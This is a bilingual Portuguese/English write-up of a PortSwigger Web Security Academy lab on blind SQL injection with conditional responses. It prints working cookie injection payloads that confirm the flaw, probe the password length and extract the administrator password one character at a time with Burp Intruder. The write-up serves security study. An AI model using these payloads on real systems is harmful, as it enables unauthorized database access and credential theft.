# Lab 11 — Blind SQL Injection with Conditional Responses

> 🇧🇷 [Português](#-português) · 🇺🇸 [English](#-english)

---

## 🇧🇷 Português

**Plataforma:** PortSwigger Web Security Academy  
**Categoria:** SQL Injection — Blind  
**Dificuldade:** 🟡 Practitioner  
**Data:** 2026-06-07

### Descrição

A aplicação executa uma query SQL com o valor do cookie `TrackingId`, mas não retorna os resultados. O único indicador disponível é a presença ou ausência da mensagem `Welcome back` na resposta. O objetivo é extrair a senha do `administrator` caractere por caractere.

### Conceito

**Blind SQL Injection** ocorre quando a aplicação é vulnerável, mas não exibe o resultado da query — tornando ataques UNION inúteis. A saída do canal é substituída por um canal lateral: variações no comportamento da resposta.

Neste caso, a técnica é **inferência booleana**: injeta-se uma condição verdadeira ou falsa e observa-se se a mensagem `Welcome back` aparece. Isso permite testar qualquer afirmação sobre o banco — incluindo, caractere por caractere, o conteúdo de uma senha.

### Reconhecimento

**Confirmando a injeção:**

```
TrackingId=xyz' AND '1'='1
```
→ `Welcome back` aparece (condição verdadeira)

```
TrackingId=xyz' AND '1'='2
```
→ `Welcome back` não aparece (condição falsa)

O comportamento diferente confirma o canal de inferência booleana.

**Confirmando a tabela `users`:**

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
→ `Welcome back` aparece — tabela existe.

**Confirmando o usuário `administrator`:**

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
→ `Welcome back` aparece — usuário existe.

### Exploração

**Descobrindo o tamanho da senha:**

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Incrementando o valor até `Welcome back` desaparecer — a senha tem **20 caracteres**.

**Extraindo cada caractere com Burp Intruder:**

Para cada posição, o payload usa `SUBSTRING(password, posição, 1)` e testa todos os caracteres `a-z` e `0-9`:

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

No Intruder, configurar:
- Payload: lista simples com `a-z` e `0-9`
- Grep Match: `Welcome back`

O caractere que retorna `Welcome back` é o correto para aquela posição. Repetir para todas as 20 posições.

### O que aprendi

- Blind SQLi exige paciência e automação — extrair 20 caracteres manualmente seria inviável
- A chave é identificar um comportamento binário confiável (presente/ausente) como canal de inferência
- Burp Intruder com Grep Match automatiza a leitura dos resultados
- `SUBSTRING(string, início, tamanho)` é a função central nesse tipo de ataque

### Referências

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder)

---

## 🇺🇸 English

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection — Blind  
**Difficulty:** 🟡 Practitioner  
**Date:** 2026-06-07

### Description

The application executes a SQL query with the `TrackingId` cookie value but doesn't return the results. The only available indicator is the presence or absence of a `Welcome back` message in the response. The goal is to extract the `administrator` password character by character.

### Concept

**Blind SQL Injection** occurs when the application is vulnerable but doesn't display the query result — making UNION attacks useless. The output channel is replaced by a side channel: variations in response behavior.

In this case, the technique is **boolean inference**: a true or false condition is injected and the presence of `Welcome back` is observed. This allows testing any statement about the database — including, character by character, the contents of a password.

### Reconnaissance

**Confirming injection:**

```
TrackingId=xyz' AND '1'='1
```
→ `Welcome back` appears (true condition)

```
TrackingId=xyz' AND '1'='2
```
→ `Welcome back` doesn't appear (false condition)

Different behavior confirms the boolean inference channel.

**Confirming the `users` table:**

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
→ `Welcome back` appears — table exists.

**Confirming the `administrator` user:**

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
→ `Welcome back` appears — user exists.

### Exploitation

**Finding the password length:**

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Incrementing the value until `Welcome back` disappears — the password is **20 characters** long.

**Extracting each character with Burp Intruder:**

For each position, the payload uses `SUBSTRING(password, position, 1)` and tests all `a-z` and `0-9` characters:

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

In Intruder, configure:
- Payload: simple list with `a-z` and `0-9`
- Grep Match: `Welcome back`

The character that returns `Welcome back` is correct for that position. Repeat for all 20 positions.

### What I learned

- Blind SQLi requires patience and automation — extracting 20 characters manually would be impractical
- The key is identifying a reliable binary behavior (present/absent) as an inference channel
- Burp Intruder with Grep Match automates result reading
- `SUBSTRING(string, start, length)` is the central function in this type of attack

### References

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder)
